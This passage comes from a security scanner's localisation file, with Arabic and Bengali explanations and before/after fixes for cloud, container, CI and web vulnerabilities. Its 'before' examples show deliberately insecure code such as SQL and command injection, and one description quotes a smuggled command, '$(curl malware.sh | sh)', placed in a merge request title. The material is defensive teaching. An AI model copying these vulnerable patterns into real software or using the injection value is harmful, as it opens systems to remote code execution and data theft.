      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "سياسة IAM مُعرَّفة في Terraform تمنح وصولاً كاملاً",
    description:
      'عبارة (statement) بإجراء "*" ومورد "*" تمنح وصولاً كاملاً إلى كل خدمة ومورد في AWS — نفس الفحص الذي يُجرى على حالة IAM الفعلية، لكن هنا يُقرأ مباشرة من الكود قبل تطبيقه حتى. قد يكون ذلك مقصودًا لدور طوارئ، لكن يجب التأكد من ذلك: للاستخدام اليومي، امنح فقط الصلاحيات اللازمة فعلاً.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "دلو Google Cloud Storage أصبح قابلاً للقراءة من أي شخص",
    description:
      'مورد "google_storage_bucket_iam_member" أو "google_storage_bucket_iam_binding" يمنح دورًا لـ "allUsers" أو "allAuthenticatedUsers" — الأول يجعل الدلو قابلاً للقراءة من أي شخص على الإنترنت، حتى دون حساب Google؛ والثاني من أي شخص يملك أي حساب Google، وليس فقط من ينبغي أن يملك الوصول.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # فقط من ينبغي أن يملك الوصول فعلاً، وليس allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "الوصول العام إلى الكائنات الثنائية (blobs) مفعَّل على حساب تخزين Azure",
    description:
      '"allow_blob_public_access" مضبوط على true في "azurerm_storage_account": أي شخص يعرف رابط كائن ثنائي أو حاوية جُعلت عامة يمكنه قراءته، دون أي مصادقة.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "دور IAM في Google Cloud يمنح وصولاً كاملاً (Owner/Editor)",
    description:
      '"google_project_iam_binding"/"google_project_iam_member" (أو ما يعادلها على مستوى المؤسسة/المجلد) يُسند الدور الأساسي "roles/owner" أو "roles/editor" — وصول شبه كامل إلى كل خدمة في المشروع. قد يكون ذلك مقصودًا لحساب طوارئ، لكن يجب التأكد من ذلك: للاستخدام اليومي، امنح فقط الأدوار المحددة مسبقًا الأكثر تحديدًا واللازمة فعلاً.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # فقط الدور المحدد مسبقًا اللازم فعلاً، وليس roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "تعيين دور في Azure يمنح وصولاً كاملاً (Owner)",
    description:
      '"azurerm_role_assignment" يُسند الدور "Owner" — وصول كامل، بما في ذلك التحكم في صلاحيات المستخدمين الآخرين، على كامل النطاق المُسند (اشتراك، مجموعة موارد...). قد يكون ذلك مقصودًا لحساب طوارئ، لكن يجب التأكد من ذلك: للاستخدام اليومي، امنح فقط الدور الأكثر تحديدًا واللازم فعلاً (مثل "Contributor" على مجموعة موارد واحدة).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # فقط الدور الأكثر تحديدًا واللازم فعلاً، وليس Owner على كامل الاشتراك\n}`,
    },
  },
  "weak-random-token": {
    title: "رمز أمان مُولَّد بمولّد أرقام عشوائية غير آمن تشفيريًا",
    description:
      "قيمة باسم يشبه token/session/reset/otp/csrf مُولَّدة باستخدام Math.random() (جافاسكريبت)، أو random.random() (بايثون)، أو rand() (بي إتش بي) — مولّدات غير مصممة للأمان، تسلسلاتها قابلة للتنبؤ. رمز مُولَّد بهذه الطريقة يمكن تخمينه أو إعادة بنائه، مما يُفقِد الغرض الذي وُجد لأجله (مثل رابط إعادة تعيين كلمة مرور يمكن لأي شخص توقّعه).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto، وليس Math.random — غير قابل للتنبؤ`,
    },
  },
  "ldap-injection": {
    title: "فلتر LDAP مبني بدمج قيمة من الطلب مباشرة",
    description:
      'سطر يبني فلتر LDAP (مثل "(uid=...)") يتضمن مباشرة قيمة مأخوذة من الطلب، دون أي معالجة (escape) للأحرف الخاصة بـ LDAP. من يتحكم بتلك القيمة يمكنه تغيير منطق الفلتر — مثلاً تجاوز فحص مصادقة أو قراءة بيانات من الدليل (directory) لا ينبغي له رؤيتها.',
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // يجب دائمًا معالجة (escape) أحرف LDAP الخاصة قبل استخدامها في فلتر\nclient.search(base, { filter });",
    },
  },
  "header-injection": {
    title: "قيمة من الطلب تنتهي مباشرة في ترويسة (header) استجابة HTTP",
    description:
      "تُضبط ترويسة استجابة HTTP بقيمة مأخوذة مباشرة من الطلب (query، body، params)، دون التحقق من خلوّها من فاصل أسطر (CRLF). يمكن لمهاجم إدراج ترويسات إضافية أو حتى استجابة مختلفة بالكامل — response splitting — مما يتيح له التلاعب بالتخزين المؤقت (cache)، أو ملفات تعريف الارتباط (cookies)، أو المحتوى المعروض لمستخدمين آخرين.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "ملف Dockerfile لا يضبط مستخدمًا غير root",
    description:
      "لا توجد تعليمة USER في Dockerfile: دون تحديدها، يعمل الحاوية كـ root. إذا تمكّن مهاجم من تنفيذ كود داخل الحاوية (مثل استغلال مكتبة ضعيفة)، فإن كونه root داخل الحاوية يسهّل احتمال الهروب نحو المضيف — أو تأثيرًا أوسع على النظام المحيط.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "بيان Kubernetes لا يفرض صراحةً التشغيل كمستخدم غير root",
    description:
      'لا وجود لـ "runAsNonRoot" في أي مكان من البيان (لا على مستوى الـ pod ولا الحاوية): دون ضبطها، تعمل الحاوية بالمستخدم الذي تحدده صورتها — غالبًا root افتراضيًا، إن لم تكن الصورة نفسها قد غيّرت ذلك. ضبطها صراحةً إلى true يجعل بدء تشغيل الـ pod يفشل إذا حاولت الصورة التشغيل كـ root رغم ذلك، بدلاً من اكتشاف الأمر بعد وقوع حادثة فقط.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "إجراء (action) من طرف ثالث في CI غير مثبَّت على نسخة دقيقة (commit SHA)",
    description:
      'يستخدم سير العمل إجراءً من طرف ثالث مُشارًا إليه بوسم (tag) أو فرع (مثل "@v1"، "@main") بدلاً من commit SHA. من يصونه — أو من يخترق حسابه — يمكنه نقل ذلك المرجع إلى commit مختلف في أي وقت، مغيّرًا بصمت ما يعمل في CI، مع إمكانية الوصول إلى أسراره. commit SHA يشير دائمًا إلى نفس الكود تمامًا.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1، مثبَّتة على commit SHA — حدّث الـ SHA عند تحديث النسخة`,
    },
  },
  "gha-excessive-permissions": {
    title: "سير العمل يمنح نفسه كل صلاحيات الرمز المميز بدلاً من التي يستخدمها فقط",
    description:
      '"permissions: write-all" يمنح GITHUB_TOKEN الخاص بسير العمل صلاحية الكتابة في كل شيء — issues، طلبات السحب، الحزم، عمليات النشر — حتى لو كان سير العمل يستخدم جزءًا منها فقط. إذا تم اختراق خطوة في سير العمل (تبعية خبيثة، سكربت مُحقَن)، تزيد تلك الصلاحيات الأوسع مما يستطيع فعله من يستغلها.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # فقط الصلاحيات التي يستخدمها سير العمل فعلاً`,
    },
  },
  "insecure-cookie-flags": {
    title: "ملف تعريف ارتباط (cookie) للجلسة أو المصادقة مضبوط دون علامتي Secure وHttpOnly",
    description:
      'ملف تعريف ارتباط باسم يشبه session/auth/token مضبوط دون "httpOnly" و"secure" ضمن خياراته. دون httpOnly، يمكن لأي JavaScript في الصفحة — بما في ذلك كود مُحقَن عبر XSS — قراءة ذلك الملف. دون secure، يمكن أيضًا إرساله عبر اتصال HTTP غير مشفّر.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "تبعية غير آمنة:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "لا تتوفر بعد نسخة مصححة معروفة — ففكّر في حزمة بديلة أو تابع تحديثات المشروع."
      ),
    },
  }),
  "docker-hardcoded-secret": {
    title: "سر مكتوب مباشرة في تعليمة ENV أو ARG داخل Dockerfile",
    description:
      "متغيّر باسم يشبه password/secret/token/key له قيمة حرفية في تعليمة ENV أو ARG. على عكس ملف .env (الذي عادة لا ينتهي داخل الصورة)، هذه القيمة تُخبَز داخل صورة Docker نفسها — أي شخص يمكنه سحبها أو فحص سجل الطبقات (layer history) يستطيع استعادتها، حتى لو أُزيل السطر في نسخة لاحقة من Dockerfile.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# يُمرَّر عبر: docker build --build-arg DB_PASSWORD=*** (أو، الأفضل من ذلك،\n# استخدام BuildKit secret mount، الذي لا ينتهي أبدًا في سجل الطبقات)`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'صورة الأساس في Dockerfile تستخدم الوسم ":latest"',
    description:
      'تعليمة FROM تستخدم صراحةً الوسم ":latest" بدلاً من نسخة دقيقة. "latest" يتغيّر مع الوقت: نفس عملية البناء (build)، عند إعادتها في وقت آخر، قد تحصل على نسخة مختلفة من صورة الأساس — بناء غير قابل لإعادة الإنتاج، وتحديث غير مرغوب فيه قد يصل دون أن يقرر ذلك أحد.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "ملف Dockerfile يُنزّل ملفًا عن بُعد باستخدام ADD بدلاً من COPY",
    description:
      "تعليمة ADD برابط http/https تُنزّل ملفًا من الإنترنت أثناء عملية البناء، دون أي تحقق من السلامة ودون أن يكون المحتوى مرئيًا في المستودع. إذا تم اختراق ذلك الرابط مستقبلاً، يدمج البناء محتوى عشوائيًا دون أن يلاحظ أحد ذلك بمجرد قراءة Dockerfile.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<hash متوقع>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "k8s-privileged-container": {
    title: "حاوية في بيان Kubernetes تعمل بوضع privileged",
    description:
      '"privileged: true" في securityContext الخاص بالحاوية يعطّل تقريبًا كل العزل المعتاد بين الحاوية والمضيف: يمكن للحاوية الوصول إلى أجهزة المضيف، وتغيير إعدادات شبكته، وفي حالات كثيرة الحصول فعليًا على صلاحيات root على الجهاز الذي يشغّلها. نادرًا ما يكون ضروريًا لتطبيق عادي.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # فقط القدرات (capabilities) اللازمة فعليًا`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "سر مكتوب نصًا صريحًا في متغيّر env ضمن بيان Kubernetes",
    description:
      'متغيّر بيئة باسم يشبه password/secret/token/key له قيمة حرفية ("value:") بدلاً من أن يُقرأ من Secret ("valueFrom.secretKeyRef"). البيان نفسه — وغالبًا ما يُحفظ في مستودع — يحتوي بالتالي على السر نصًا صريحًا، مرئيًا حتى لمن يستطيع فقط قراءة الإعدادات، دون الحاجة لتنفيذ أوامر في الكتلة (cluster).',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "k8s-run-as-root": {
    title: "حاوية في بيان Kubernetes مضبوطة لتعمل كـ root",
    description:
      '"runAsUser: 0" أو "runAsNonRoot: false" في securityContext يفرضان صراحةً التشغيل كـ root داخل الحاوية. إذا تمكّن مهاجم من تنفيذ كود في الحاوية (مثل استغلال مكتبة ضعيفة)، فإن كونه root داخل الحاوية يسهّل احتمال الهروب نحو المضيف — أو تأثيرًا أوسع.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "حاوية في بيان Kubernetes يمكنها الحصول على صلاحيات أكثر مما بدأت به",
    description:
      '"allowPrivilegeEscalation: true" في securityContext يسمح لعملية داخل الحاوية بالحصول على صلاحيات أكثر من العملية التي أطلقتها (مثل عبر ملف تنفيذي بخاصية setuid). مع وجود ثغرة في التطبيق، يصبح ذلك خطوة إضافية نحو تنفيذ كود بصلاحيات أكبر من المقصود.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "حجرة (pod) في بيان Kubernetes تشارك شبكة المضيف أو عملياته أو ذاكرته المشتركة",
    description:
      '"hostNetwork" أو "hostPID" أو "hostIPC" مضبوطة على true تُخرج الـ pod من عزله المعتاد: hostNetwork يعرّض الـ pod على شبكة المضيف (متجاوزًا سياسات شبكة الكتلة)، hostPID يمنحه رؤية لكل عمليات الجهاز المضيف، hostIPC يمنحه وصولاً إلى الذاكرة المشتركة للمضيف. نادرًا ما يكون ضروريًا لتطبيق عادي — عادة فقط لأدوات نظام/مراقبة منخفضة المستوى.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
    "gitlab-ci-script-injection": {
      title: 'قيمة يتحكم بها مستخدم خارجي تمر عبر غلاف صَدَفي ثانٍ في خط أنابيب GitLab CI',
      description: 'يستخدم سطر "script:" (أو "before_script:"/"after_script:") أمر "eval" أو "sh -c"/"bash -c" مع متغيّر محدد مسبقًا من GitLab مثل عنوان طلب الدمج، أو رسالة الالتزام، أو اسم الفرع — وكلها قابلة للكتابة من قِبل أي شخص يفتح طلب دمج، حتى من نسخة خارجية (fork). تُوسَّع القيمة أولًا بواسطة الصَدَفة الخارجية ثم تُلصق داخل سلسلة نصية تفسرها الصَدَفة الثانية مرة أخرى كشيفرة: عنوان مثل "$(curl malware.sh | sh)" سيُنفّذ أوامر عشوائية في خط الأنابيب، مع وصول إلى كل الأسرار المتاحة في تلك المهمة.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # يُمرَّر كوسيطة للأمر، أبدًا داخل سلسلة "bash -c" التي قد تعيد تفسيره`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'Docker-in-Docker في خط أنابيب GitLab CI يعمل بتشفير TLS معطّل',
      description: 'تستخدم المهمة خدمة "docker:dind" (Docker-in-Docker، ضرورية لبناء الصور داخل خط الأنابيب) لكنها تضبط "DOCKER_TLS_CERTDIR" على سلسلة نصية فارغة، مما يعطّل تمامًا تشفير TLS بين عميل Docker وخادم dind. بدون TLS، يمكن لأي شخص يصل إلى تلك المنفذ على نفس الشبكة الداخلية للـ runner أن يتحكم في خادم Docker — الذي يعمل بصلاحيات موسّعة — بدلًا من أن يقتصر على المهمة التي يُفترض أن تستخدمه.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # يبقى TLS مفعّلًا بين عميل Docker وخادم dind — "" يعطّله تمامًا`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'صورة Docker لخط أنابيب GitLab CI غير مثبّتة على إصدار محدد',
      description: 'يشير "image:" في خط الأنابيب إلى صورة بلا وسم (يعادل ":latest") أو صراحة إلى ":latest". يمكن لمن يصون تلك الصورة استبدال محتواها في أي وقت دون أن يتغيّر المستودع — يمكن لنفس خط الأنابيب أن يبدأ بتشغيل شيفرة مختلفة من يوم لآخر، وهو خطر سلسلة توريد مطابق من حيث المبدأ لإجراء GitHub مُشار إليه بوسم بدلاً من التزام.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # وسم محدد (أو أفضل من ذلك ملخّص "node@sha256:...") بدلاً من "latest"`,
      },
    },
},
  bn: {
  "supabase-service-role-in-client": {
    title: "Supabase-এর গোপন কী ব্রাউজারের জন্য তৈরি একটি ফাইলে চলে যায়",
    description:
      "একটি পাবলিক প্রিফিক্সযুক্ত ভেরিয়েবল (যেমন NEXT_PUBLIC_, VITE_) অথবা ক্লায়েন্ট-সাইড ফাইল Supabase-এর service role key-কে রেফারেন্স করে। এই কী Row Level Security বাইপাস করে: যদি এটি ব্রাউজার বান্ডেলে চলে যায়, তাহলে যে কেউ এটি পড়ে ডেটাবেসে অ্যাডমিনিস্ট্রেটর হিসেবে কাজ করতে পারে।",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (শুধু সার্ভার)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "কোডে সরাসরি পাসওয়ার্ড বা গোপন কী লেখা আছে",
    description:
      "একটি API কী, টোকেন বা পাসওয়ার্ড এনভায়রনমেন্ট ভেরিয়েবল থেকে না পড়ে সরাসরি লিটারাল ভ্যালু হিসেবে লেখা মনে হচ্ছে। যে কেউ সোর্স কোড (বা রিপোজিটরি, যদি পাবলিক হয়) পড়লে সেই গোপন তথ্য পেয়ে যাবে।",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "প্রজেক্টের আসল পাসওয়ার্ড সহ একটি ফাইল বিশ্লেষণ করা ফাইলগুলোর মধ্যে আছে",
    description:
      "আসল মান সহ একটি .env ফাইল (একটি .env.example নয়) বিশ্লেষণে অন্তর্ভুক্ত করা হয়েছে। এই ফাইলটি যদি কোনো রিপোজিটরি বা পাবলিক ডিপ্লয়মেন্টে চলে যায়, তাহলে এতে থাকা প্রতিটি ক্রেডেনশিয়াল প্রকাশিত হয়ে যায়।",
    fix: {
      before: `# .env (ভুলবশত কমিট করা হয়েছে)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (কমিট করা)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env রিপো থেকে বাইরে থাকে (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "যে কেউ সব ব্যবহারকারীর ডেটা পড়তে বা পরিবর্তন করতে পারে",
    description:
      "Row Level Security নিষ্ক্রিয় করা আছে, অথবা একটি পলিসি কে অনুরোধ করছে তা যাচাই না করেই যে কাউকে অ্যাক্সেস দেয় (USING (true))। প্রতিটি প্রমাণীকৃত ব্যবহারকারী — এমনকি একজন অজ্ঞাতনামা ব্যবহারকারীও — অন্য সবার ডেটা পড়তে বা পরিবর্তন করতে পারে।",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "ব্যবহারকারীর দেওয়া একটি মান সরাসরি ডেটাবেস কোয়েরিতে বসানো হয়",
    description:
      "প্যারামিটার ব্যবহার না করে সরাসরি একটি স্ট্রিং concatenate বা interpolate করে একটি SQL কোয়েরি তৈরি করা হয়েছে। যদি সেই টেক্সট (এমনকি পরোক্ষভাবেও) একজন ব্যবহারকারীর কাছ থেকে আসে, তাহলে এটি কোয়েরি নিজেই পরিবর্তন করতে পারে — SQL injection।",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "পাসওয়ার্ডগুলো সুরক্ষিত বলে মনে হচ্ছে না",
    description:
      "একটি পাসওয়ার্ড ফিল্ড অনুরোধ থেকে যেভাবে এসেছে ঠিক সেভাবেই সংরক্ষণ করা হয়, এবং ফাইলে কোনো হ্যাশিং ফাংশন (bcrypt, argon2, scrypt) দেখা যায় না। ডেটাবেস যদি কখনো compromise হয়, তাহলে প্রতিটি পাসওয়ার্ড সাথে সাথেই ব্যবহারযোগ্য হয়ে যাবে।",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "লগইন সাইন করতে ব্যবহৃত সিক্রেট কোডে প্লেইন টেক্সটে লেখা আছে",
    description:
      "jwt.sign / jwt.verify-এ পাস করা সিক্রেট (অথবা JWT_SECRET ভেরিয়েবল) এনভায়রনমেন্ট ভেরিয়েবল থেকে না এসে কোডে একটি লিটারাল ভ্যালু। যে কেউ এটি পড়লে যেকোনো ব্যবহারকারীর জন্য বৈধ অ্যাক্সেস টোকেন তৈরি করতে পারবে।",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "সার্ভারকে বাহ্যিক কমান্ড চালাতে বাধ্য করা যেতে পারে",
    description:
      "সিস্টেম কমান্ড চালানো একটি ফাংশন (exec, execSync, spawn) interpolation বা concatenation দিয়ে তৈরি একটি স্ট্রিং গ্রহণ করে। সেই স্ট্রিং-এর একটি অংশ যদি ব্যবহারকারীর ইনপুট থেকে আসে, তাহলে যে এটি নিয়ন্ত্রণ করে সে সার্ভারে যেকোনো কমান্ড চালাতে পারে।",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "বাইরে থেকে পাথ বেছে নিয়ে সার্ভারের একটি ফাইল পড়া বা লেখা যেতে পারে",
    description:
      'একটি ফাইল পড়া, লেখা বা পাঠানো একটি ফাংশন সরাসরি অনুরোধের একটি মান (query, body, params) থেকে পাথ নেয়, এটি অনুমোদিত ফোল্ডারের ভেতরে থাকছে কিনা তা যাচাই না করেই। একজন আক্রমণকারী উদ্দিষ্ট ফোল্ডার থেকে বের হতে "../" প্রবেশ করিয়ে সার্ভারের যেকোনো ফাইল পড়তে বা ওভাররাইট করতে পারে (যেমন ক্রেডেনশিয়ালসহ একটি কনফিগারেশন ফাইল)।',
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("পাথ অনুমোদিত নয়")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "ব্যবহারকারীর দেওয়া একটি মান একটি MongoDB কোয়েরির মধ্যে কোড হিসেবে চালানো হয়",
    description:
      "MongoDB-এর $where অপারেটর প্রতিটি ডকুমেন্টের জন্য সার্ভার-সাইড JavaScript চালায় — সেই স্ট্রিংটি যদি ব্যবহারকারীর কাছ থেকে আসা একটি মান concatenate করে তৈরি করা হয়, তাহলে যে এটি নিয়ন্ত্রণ করে সে একটি সাধারণ SQL injection-এর মতো শুধু ফিল্টার পরিবর্তন নয়, বরং ডেটাবেসের প্রসঙ্গে নির্বিচারে কোড চালাতে পারে।",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "ব্যবহারকারীর দেওয়া একটি মানকে ডেটা নয়, একটি টেমপ্লেট হিসেবে ব্যাখ্যা করা হয়",
    description:
      "একটি টেমপ্লেট কম্পাইল/রেন্ডার করা একটি ফাংশন একটি নির্দিষ্ট টেমপ্লেট ব্যবহার করে শুধু ডেটা পাস করার বদলে, অনুরোধের একটি মান থেকে পুরো টেমপ্লেটটি গ্রহণ করে। একজন আক্রমণকারী সরাসরি টেমপ্লেট ইঞ্জিনের সিনট্যাক্সে লিখতে পারে (যেমন Jinja2-এর জন্য {{7*7}}) এবং সার্ভারে কোড চালাতে পারে — Server-Side Template Injection, যা প্রায়ই নির্বিচারে কমান্ড execution পর্যন্ত নিয়ে যায়, XSS-এর মতো শুধু একটি ডিসপ্লে সমস্যা নয়।",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "XML পার্সারকে ফাইল পড়তে বা বাহ্যিক অনুরোধ পাঠাতে বাধ্য করা যেতে পারে",
    description:
      "একটি XML পার্সার (DocumentBuilderFactory) কাছাকাছি লাইনগুলোতে স্পষ্টভাবে বাহ্যিক entities (DOCTYPE) নিষ্ক্রিয় না করেই তৈরি করা হয়েছে। পার্সারটি যদি অবিশ্বস্ত উৎস থেকে XML পায়, তাহলে একজন আক্রমণকারী সার্ভারের ফাইল পড়তে বা এটিকে তার পছন্দের একটি ঠিকানায় যোগাযোগ করাতে একটি বাহ্যিক entity ডিফাইন করতে পারে — XML External Entity।",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "docker-hardcoded-secret": {
    title: "Dockerfile-এর একটি ENV বা ARG নির্দেশে সরাসরি একটি সিক্রেট লেখা আছে",
    description:
      "password/secret/token/key-এর মতো নামের একটি ভেরিয়েবলের একটি ENV বা ARG নির্দেশে লিটারাল মান আছে। একটি .env ফাইলের বিপরীতে (যা সাধারণত ইমেজে যায় না), এই মানটি Docker ইমেজেই বেক করা হয়ে যায় — যে কেউ এটি pull করতে বা layer history দেখতে পারে সে এটি উদ্ধার করতে পারবে, Dockerfile-এর পরবর্তী ভার্সনে লাইনটি সরানো হলেও।",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# পাস করা হয় এভাবে: docker build --build-arg DB_PASSWORD=*** (অথবা, আরও ভালো,\n# একটি BuildKit secret mount দিয়ে, যা কখনো layer history-তে যায় না)`,
    },
  },
  "k8s-privileged-container": {
    title: "Kubernetes manifest-এর একটি container privileged হিসেবে চলে",
    description:
      'একটি container-এর securityContext-এ "privileged: true" container ও host-এর মধ্যে স্বাভাবিক isolation প্রায় পুরোপুরি নিষ্ক্রিয় করে দেয়: container host-এর device অ্যাক্সেস করতে পারে, এর নেটওয়ার্ক কনফিগারেশন পরিবর্তন করতে পারে, এবং অনেক ক্ষেত্রে কার্যকরভাবে এটি যে মেশিনে চলছে তাতে root অ্যাক্সেস পেতে পারে। একটি সাধারণ অ্যাপের জন্য প্রায় কখনোই প্রয়োজন হয় না।',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # শুধু সত্যিই প্রয়োজনীয় capability`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Kubernetes manifest-এর env ভেরিয়েবলে একটি সিক্রেট প্লেইন টেক্সটে লেখা আছে",
    description:
